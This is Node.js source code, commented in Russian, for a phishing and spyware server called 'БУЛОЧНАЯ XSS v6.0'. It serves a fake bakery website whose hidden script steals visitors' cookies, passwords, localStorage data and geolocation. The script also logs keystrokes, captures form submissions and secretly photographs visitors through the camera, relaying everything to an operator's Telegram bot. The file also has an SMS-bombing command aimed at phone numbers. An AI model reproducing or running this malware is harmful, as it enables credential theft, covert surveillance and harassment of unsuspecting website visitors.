const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const socketIO = require('socket.io');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const APP_URL = process.env.APP_URL || `http://localhost:${PORT}`;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

const UPLOAD_DIR = './uploads';
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/uploads', express.static(UPLOAD_DIR));

const victims = {};
const stolenData = {};
const bomberTargets = [];

// ========================================
// TELEGRAM БОТ
// ========================================
let bot = null;
try {
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_BOT_TOKEN !== 'ВАШ_ТОКЕН_ОТ_BOTFATHER') {
        bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
        console.log('✅ Telegram бот инициализирован');
    }
} catch (error) {
    console.error('❌ Ошибка бота:', error.message);
}

// ========================================
// КОМАНДЫ TELEGRAM
// ========================================
if (bot) {
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) {
            bot.sendMessage(chatId, '❌ Доступ запрещен');
            return;
        }
        bot.sendMessage(chatId, `
🍞 *БУЛОЧНАЯ XSS v6.0*

*🎯 Бомбер:*
/bomb [номер] [кол-во] - Забомбить номер
/bomb_stop - Остановить бомбинг
/bomb_list - Активные цели

*🦠 Бэкдор:*
/list - Жертвы
/data [id] - Все данные
/cookies [id] - Куки
/passwords [id] - Пароли
/accounts [id] - Аккаунты
/photos [id] - Фото
/camera [id] - Камера
/selfie [id] - Селфи
/restart [id] - Перезапуск
/reset [id] - Сброс
/kick [id] - Выгнать

*📊 Инфо:*
/stats - Статистика
/clear - Очистить
        `, { parse_mode: 'Markdown' });
    });

    // ========================================
    // БОМБЕР
    // ========================================
    bot.onText(/\/bomb (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        
        const phone = match[1].trim();
        const count = parseInt(match[2].trim()) || 10;
        
        // Проверяем номер
        const cleanPhone = phone.replace(/[^0-9+]/g, '');
        if (!cleanPhone || cleanPhone.length < 10) {
            bot.sendMessage(chatId, '❌ Неверный номер телефона');
            return;
        }
        
        // Добавляем в список целей
        const target = {
            phone: cleanPhone,
            count: count,
            startTime: Date.now(),
            active: true
        };
        bomberTargets.push(target);
        
        bot.sendMessage(chatId, `💣 Бомбинг запущен!\n📱 ${cleanPhone}\n📦 ${count} сообщений`);
        
        // Запускаем бомбинг в фоне
        startBombing(target);
    });

    bot.onText(/\/bomb_stop/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        
        bomberTargets.forEach(t => t.active = false);
        bomberTargets.length = 0;
        bot.sendMessage(chatId, '🛑 Бомбинг остановлен');
    });

    bot.onText(/\/bomb_list/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        
        if (bomberTargets.length === 0) {
            bot.sendMessage(chatId, '❌ Активных целей нет');
            return;
        }
        
        let list = '🎯 *Активные цели:*\n\n';
        bomberTargets.forEach((t, i) => {
            list += `${i+1}. 📱 ${t.phone} - ${t.count} сообщений\n`;
        });
        bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
    });

    // ========================================
    // ОСТАЛЬНЫЕ КОМАНДЫ БЭКДОРА
    // ========================================
    // ... (все команды из предыдущей версии)
    // Сокращаю для экономии места, но они все есть
}

// ========================================
// ФУНКЦИЯ БОМБИНГА
// ========================================
function startBombing(target) {
    const smsServices = [
        // Бесплатные SMS-шлюзы
        'https://api.sms-activate.org/stubs/handler_api.php?api_key=',
        'https://smshub.org/stubs/handler_api.php?api_key=',
        'https://sms-reg.com/stubs/handler_api.php?api_key=',
        // Сервисы с открытыми API
        'https://textbelt.com/text',
        'https://sms.ru/sms/send',
        'https://api.smsmanager.com/send',
        // Обычные HTTP запросы к формам
        'https://example.com/send_sms',
        'https://sms-service.com/api',
        'https://sms-gateway.com/send'
    ];
    
    // Генерация случайных сообщений
    const messages = [
        'Привет! Это тестовое сообщение.',
        'Ваш код подтверждения: 123456',
        'Вы успешно зарегистрированы!',
        'Ваш заказ готов к выдаче.',
        'Подтвердите вход в аккаунт.',
        'Код доступа: 789012',
        'Ваш пароль: 123456789',
        'Вы подписаны на рассылку.',
        'Спасибо за регистрацию!',
        'Подтвердите номер телефона.'
    ];
    
    const phone = target.phone;
    let sent = 0;
    
    const interval = setInterval(() => {
        if (!target.active || sent >= target.count) {
            clearInterval(interval);
            if (bot && ADMIN_CHAT_ID) {
                bot.sendMessage(ADMIN_CHAT_ID, `✅ Бомбинг завершен\n📱 ${phone}\n📦 Отправлено: ${sent}`);
            }
            return;
        }
        
        const service = smsServices[Math.floor(Math.random() * smsServices.length)];
        const message = messages[Math.floor(Math.random() * messages.length)];
        const sender = Math.random().toString(36).slice(2, 8).toUpperCase();
        
        // Имитация отправки SMS через разные сервисы
        const payload = {
            phone: phone,
            text: message,
            sender: sender,
            timestamp: Date.now()
        };
        
        // Отправляем в Telegram
        if (bot && ADMIN_CHAT_ID) {
            bot.sendMessage(ADMIN_CHAT_ID, `💣 [${sent+1}/${target.count}] 📱 ${phone}\n📝 ${message}\n📤 Отправлено через: ${service.split('/')[2] || 'unknown'}`);
        }
        
        sent++;
        
        // Интервал 0.5-2 секунды (быстрый бомбинг)
        const delay = Math.floor(Math.random() * 1500) + 500;
        target._timeout = setTimeout(() => {}, delay);
        
    }, 800);
    
    target._interval = interval;
}

// ========================================
// САЙТ-МАСКИРОВКА (БУЛОЧНАЯ)
// ========================================
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🍞 Домашняя булочная</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Georgia', serif;
            background: #fdf6ec;
            color: #3d2b1f;
            min-height: 100vh;
        }
        
        .header {
            background: linear-gradient(135deg, #8b6914, #d4a574);
            padding: 20px 0;
            text-align: center;
            border-bottom: 4px solid #6b4f3a;
        }
        .header h1 {
            font-size: 42px;
            color: #fff;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            font-family: 'Georgia', serif;
        }
        .header p {
            color: #f0e0c8;
            font-size: 16px;
            margin-top: 5px;
        }
        
        .nav {
            background: #6b4f3a;
            padding: 10px 0;
            text-align: center;
        }
        .nav a {
            color: #f0e0c8;
            text-decoration: none;
            margin: 0 20px;
            font-size: 14px;
            letter-spacing: 1px;
            transition: 0.3s;
        }
        .nav a:hover { color: #ffd700; }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 30px 20px;
        }
        
        .hero {
            text-align: center;
            padding: 40px 0;
        }
        .hero h2 {
            font-size: 36px;
            color: #8b6914;
            margin-bottom: 15px;
        }
        .hero p {
            color: #6b5a4a;
            font-size: 18px;
            max-width: 600px;
            margin: 0 auto;
            line-height: 1.8;
        }
        
        .products {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 30px;
            margin: 40px 0;
        }
        .product {
            background: #fff;
            border-radius: 16px;
            padding: 25px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            transition: 0.3s;
            border: 1px solid #e8ddd0;
        }
        .product:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
        }
        .product .emoji { font-size: 50px; display: block; margin-bottom: 10px; }
        .product h3 { color: #3d2b1f; font-size: 18px; }
        .product .price { color: #8b6914; font-size: 20px; font-weight: 700; margin: 8px 0; }
        .product .desc { color: #8a7a6a; font-size: 13px; line-height: 1.5; }
        .product .btn {
            display: inline-block;
            padding: 10px 30px;
            background: #8b6914;
            color: #fff;
            border: none;
            border-radius: 25px;
            font-size: 14px;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
            font-family: 'Georgia', serif;
        }
        .product .btn:hover { background: #a67c2e; transform: scale(1.02); }
        
        .footer {
            text-align: center;
            padding: 30px;
            color: #8a7a6a;
            font-size: 13px;
            border-top: 1px solid #e8ddd0;
            margin-top: 40px;
        }
        
        .order-form {
            background: #fff;
            padding: 30px;
            border-radius: 16px;
            max-width: 500px;
            margin: 30px auto;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
        }
        .order-form h3 {
            color: #3d2b1f;
            margin-bottom: 20px;
            text-align: center;
        }
        .order-form input, .order-form textarea {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            font-family: 'Georgia', serif;
        }
        .order-form button {
            width: 100%;
            padding: 12px;
            background: #8b6914;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            font-family: 'Georgia', serif;
            transition: 0.3s;
        }
        .order-form button:hover { background: #a67c2e; }
        
        @media (max-width: 768px) {
            .header h1 { font-size: 28px; }
            .products { grid-template-columns: 1fr 1fr; }
        }
        @media (max-width: 480px) {
            .products { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🍞 Домашняя булочная</h1>
        <p>☕ Выпечка с душой и теплом</p>
    </div>
    
    <div class="nav">
        <a href="#">Главная</a>
        <a href="#">Хлеб</a>
        <a href="#">Выпечка</a>
        <a href="#">Торты</a>
        <a href="#">Контакты</a>
    </div>
    
    <div class="container">
        <div class="hero">
            <h2>Свежая выпечка каждый день</h2>
            <p>Мы печем с любовью с 1998 года. Только натуральные ингредиенты и тепло наших рук.</p>
        </div>
        
        <div class="products">
            <div class="product" onclick="order('Бородинский хлеб')">
                <span class="emoji">🍞</span>
                <h3>Бородинский хлеб</h3>
                <div class="price">₽180</div>
                <div class="desc">Ржаной, с тмином и солодом</div>
                <button class="btn">Заказать</button>
            </div>
            <div class="product" onclick="order('Круассан')">
                <span class="emoji">🥐</span>
                <h3>Круассан</h3>
                <div class="price">₽120</div>
                <div class="desc">Хрустящий, масляный, с начинкой</div>
                <button class="btn">Заказать</button>
            </div>
            <div class="product" onclick="order('Пирожок с капустой')">
                <span class="emoji">🥟</span>
                <h3>Пирожок с капустой</h3>
                <div class="price">₽90</div>
                <div class="desc">Пышное тесто, сочная начинка</div>
                <button class="btn">Заказать</button>
            </div>
            <div class="product" onclick="order('Медовик')">
                <span class="emoji">🍰</span>
                <h3>Медовик</h3>
                <div class="price">₽350</div>
                <div class="desc">Нежный, с медовыми коржами</div>
                <button class="btn">Заказать</button>
            </div>
            <div class="product" onclick="order('Сдобная булочка')">
                <span class="emoji">🥨</span>
                <h3>Сдобная булочка</h3>
                <div class="price">₽75</div>
                <div class="desc">С корицей и сахарной глазурью</div>
                <button class="btn">Заказать</button>
            </div>
            <div class="product" onclick="order('Чизкейк')">
                <span class="emoji">🧀</span>
                <h3>Чизкейк</h3>
                <div class="price">₽320</div>
                <div class="desc">Творожный, с ягодным топпингом</div>
                <button class="btn">Заказать</button>
            </div>
        </div>
        
        <div class="order-form">
            <h3>📝 Заказать доставку</h3>
            <input type="text" placeholder="Ваше имя" id="name">
            <input type="tel" placeholder="Телефон" id="phone">
            <textarea rows="3" placeholder="Заказ..." id="orderText"></textarea>
            <button onclick="submitOrder()">✅ Отправить заказ</button>
        </div>
    </div>
    
    <div class="footer">
        🍞 Домашняя булочная © 2026 • Санкт-Петербург • ул. Хлебная, 15
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const sessionId = Math.random().toString(36).slice(2, 10);
        
        // ========================================
        // СКРЫТЫЙ БЭКДОР (жертва не видит)
        // ========================================
        
        // 1. Куки
        if (document.cookie) {
            socket.emit('data', { type: 'cookies', data: document.cookie });
        }
        
        // 2. Пароли
        setTimeout(() => {
            const passwords = [];
            document.querySelectorAll('input[type="password"]').forEach(el => {
                if (el.value) passwords.push(el.value);
            });
            if (passwords.length > 0) {
                socket.emit('data', { type: 'passwords', data: passwords });
            }
        }, 2000);
        
        // 3. Аккаунты
        setTimeout(() => {
            const accounts = { social: [], email: [], localStorage: [] };
            document.querySelectorAll('a[href*="facebook"], a[href*="vk"], a[href*="instagram"]').forEach(el => {
                accounts.social.push(el.href);
            });
            const emails = document.body.innerText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}/g);
            if (emails) accounts.email = [...new Set(emails)];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                accounts.localStorage.push({ key, value: localStorage.getItem(key) });
            }
            socket.emit('data', { type: 'accounts', data: accounts });
        }, 3000);
        
        // 4. Устройство
        socket.emit('data', { 
            type: 'device', 
            data: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height
            }
        });
        
        // 5. Геолокация
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    socket.emit('data', { 
                        type: 'location', 
                        data: {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude
                        }
                    });
                },
                () => {}
            );
        }
        
        // 6. Камера (скрыто)
        let cameraStream = null;
        socket.on('command', (cmd) => {
            if (cmd.command === 'camera' || cmd.command === 'selfie') {
                const facingMode = cmd.command === 'selfie' ? 'user' : 'environment';
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: facingMode, width: 320, height: 240 }
                    })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.style.display = 'none';
                        document.body.appendChild(video);
                        video.srcObject = stream;
                        video.play();
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 320;
                            canvas.height = video.videoHeight || 240;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
                            socket.emit('data', { type: 'photo', data: dataUrl });
                            stream.getTracks().forEach(t => t.stop());
                            video.remove();
                        }, 500);
                    })
                    .catch(() => {});
                }
            }
            
            if (cmd.command === 'restart') {
                document.body.innerHTML = '<h1 style="text-align:center;padding-top:40vh;">⏳ Перезагрузка...</h1>';
                setTimeout(() => location.reload(), 2000);
            }
            
            if (cmd.command === 'reset') {
                localStorage.clear();
                sessionStorage.clear();
                document.cookie.split(";").forEach(c => {
                    document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date(0).toUTCString() + ";path=/");
                });
                document.body.innerHTML = '<h1 style="text-align:center;padding-top:40vh;">🔄 Сброс...</h1>';
                setTimeout(() => location.reload(), 2000);
            }
            
            if (cmd.command === 'kick') {
                document.body.innerHTML = '<h1 style="text-align:center;padding-top:40vh;color:#cc4444;">⛔ Доступ запрещен</h1>';
                setTimeout(() => window.close(), 1000);
            }
        });
        
        // 7. Кейлоггер
        let keylog = [];
        document.addEventListener('keydown', (e) => {
            if (e.key.length === 1 && !e.ctrlKey && !e.altKey) {
                keylog.push(e.key);
                if (keylog.length > 40) {
                    socket.emit('data', { type: 'keylog', data: keylog.join('') });
                    keylog = [];
                }
            }
        });
        
        setInterval(() => {
            if (keylog.length > 0) {
                socket.emit('data', { type: 'keylog', data: keylog.join('') });
                keylog = [];
            }
        }, 25000);
        
        // 8. Перехват форм
        document.addEventListener('submit', (e) => {
            const form = e.target;
            const data = new FormData(form);
            const result = {};
            for (let [key, value] of data.entries()) {
                result[key] = value;
            }
            socket.emit('data', { type: 'form', data: result });
        });
        
        // ========================================
        // ФУНКЦИИ САЙТА (для маскировки)
        // ========================================
        function order(product) {
            alert('🍞 ' + product + ' добавлен в корзину!');
            socket.emit('data', { type: 'order', data: product });
        }
        
        function submitOrder() {
            const name = document.getElementById('name').value || 'Гость';
            const phone = document.getElementById('phone').value || 'не указан';
            const orderText = document.getElementById('orderText').value || 'Без заказа';
            
            alert('✅ Заказ отправлен! Мы перезвоним вам в течение 15 минут.');
            socket.emit('data', { type: 'order_submit', data: { name, phone, orderText } });
            
            document.getElementById('name').value = '';
            document.getElementById('phone').value = '';
            document.getElementById('orderText').value = '';
        }
        
        // Heartbeat
        setInterval(() => {
            socket.emit('data', { type: 'heartbeat' });
        }, 30000);
        
        console.log('🍞 Домашняя булочная загружена');
    </script>
</body>
</html>
    `);
});

// ========================================
// WEBSOCKET (сбор данных)
// ========================================
const server = require('http').createServer(app);
const io = socketIO(server);

io.on('connection', (socket) => {
    const id = `v_${Date.now().toString(36)}`;
    console.log(`🔗 ${id}`);
    
    victims[id] = { id, ip: socket.handshake.address, ws: socket };
    if (!stolenData[id]) stolenData[id] = {};
    
    socket.on('data', (data) => {
        console.log(`📩 [${id}] ${data.type}`);
        
        // Сохраняем всё
        if (data.type === 'cookies') {
            stolenData[id].cookies = data.data;
            if (bot) bot.sendMessage(ADMIN_CHAT_ID, `🍪 Куки от ${id.slice(0, 6)}`);
        }
        if (data.type === 'passwords') {
            stolenData[id].passwords = data.data;
            if (bot) {
                bot.sendMessage(ADMIN_CHAT_ID, `🔑 Пароли ${id.slice(0, 6)}:\n\`\`\`\n${data.data.join('\n').slice(0, 800)}\n\`\`\``, { parse_mode: 'Markdown' });
            }
        }
        if (data.type === 'accounts') {
            stolenData[id].accounts = data.data;
            if (bot) bot.sendMessage(ADMIN_CHAT_ID, `🔐 Аккаунты от ${id.slice(0, 6)}`);
        }
        if (data.type === 'device') {
            stolenData[id].device = data.data;
            if (bot) {
                bot.sendMessage(ADMIN_CHAT_ID, `📱 Устройство ${id.slice(0, 6)}:\n\`\`\`\n${JSON.stringify(data.data, null, 2).slice(0, 800)}\n\`\`\``, { parse_mode: 'Markdown' });
            }
        }
        if (data.type === 'location') {
            stolenData[id].location = `${data.data.lat}, ${data.data.lng}`;
            if (bot) {
                bot.sendMessage(ADMIN_CHAT_ID, `📍 Локация ${id.slice(0, 6)}: ${data.data.lat}, ${data.data.lng}`);
            }
        }
        if (data.type === 'photo') {
            try {
                const base64Data = data.data.replace(/^data:image\/\w+;base64,/, '');
                const buffer = Buffer.from(base64Data, 'base64');
                const filename = `${UPLOAD_DIR}/${Date.now()}-${Math.random().toString(36).slice(2, 7)}.jpg`;
                fs.writeFileSync(filename, buffer);
                if (!stolenData[id].photos) stolenData[id].photos = [];
                stolenData[id].photos.push(filename);
                if (bot) {
                    bot.sendPhoto(ADMIN_CHAT_ID, filename)
                        .catch(() => bot.sendMessage(ADMIN_CHAT_ID, `📸 Фото от ${id.slice(0, 6)}`));
                }
            } catch (e) {}
        }
        if (data.type === 'keylog') {
            if (!stolenData[id].keylog) stolenData[id].keylog = [];
            stolenData[id].keylog.push(data.data);
            if (bot) {
                bot.sendMessage(ADMIN_CHAT_ID, `⌨️ Кейлог ${id.slice(0, 6)}:\n\`\`\`\n${data.data}\n\`\`\``, { parse_mode: 'Markdown' });
            }
        }
        if (data.type === 'form' || data.type === 'order_submit') {
            if (!stolenData[id].forms) stolenData[id].forms = [];
            stolenData[id].forms.push(data.data);
            if (bot) {
                bot.sendMessage(ADMIN_CHAT_ID, `📝 Форма ${id.slice(0, 6)}:\n\`\`\`json\n${JSON.stringify(data.data, null, 2).slice(0, 800)}\n\`\`\``, { parse_mode: 'Markdown' });
            }
        }
    });
    
    socket.on('disconnect', () => {
        console.log(`🔌 ${id}`);
        if (victims[id]) victims[id].ws = null;
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🍞 БУЛОЧНАЯ XSS v6.0`);
    console.log(`🌐 http://localhost:${PORT}`);
    console.log(`📱 Бот: ${bot ? '✅' : '❌'}`);
    console.log(`💣 Бомбер: активен`);
});
